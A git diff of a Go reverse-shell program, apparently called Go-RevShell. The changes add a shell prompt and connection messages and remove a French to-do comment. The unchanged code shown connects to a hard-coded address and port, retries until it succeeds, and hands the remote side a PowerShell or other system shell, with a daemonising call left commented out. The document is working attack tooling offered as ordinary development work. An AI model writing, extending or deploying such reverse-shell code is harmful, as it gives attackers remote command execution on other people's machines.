@@ -13,9 +13,6 @@ import (
 	"github.com/takama/daemon"
 )
 
-// To-Do :
-// - afficher prompt
-
 func main() {
 	// daemonize()
 	connectToClient("192.168.1.24", 1111)
@@ -34,7 +31,7 @@ func connectToClient(host string, port int) {
 		if err != nil {
 			time.Sleep(2 * time.Second)
 		} else {
-			connexion.Write([]byte("[+] Connected to target.\n"))
+			connexion.Write([]byte("[+] Connected to server.\nType \"quit\" to close the shell properly or the process will die server side.\n"))
 			var shell string
 			if runtime.GOOS == "windows" {
 				shell = "powershell.exe"
@@ -49,6 +46,7 @@ func connectToClient(host string, port int) {
 
 func reverseShell(connexion net.Conn, shell string) {
 	for {
+		connexion.Write([]byte("[Go-RevShell@" + connexion.LocalAddr().String() + "] > "))
 		clientEntry, err := bufio.NewReader(connexion).ReadString('\n')
 		handleError(err)
 		clientEntry = strings.TrimSuffix(clientEntry, "\n")
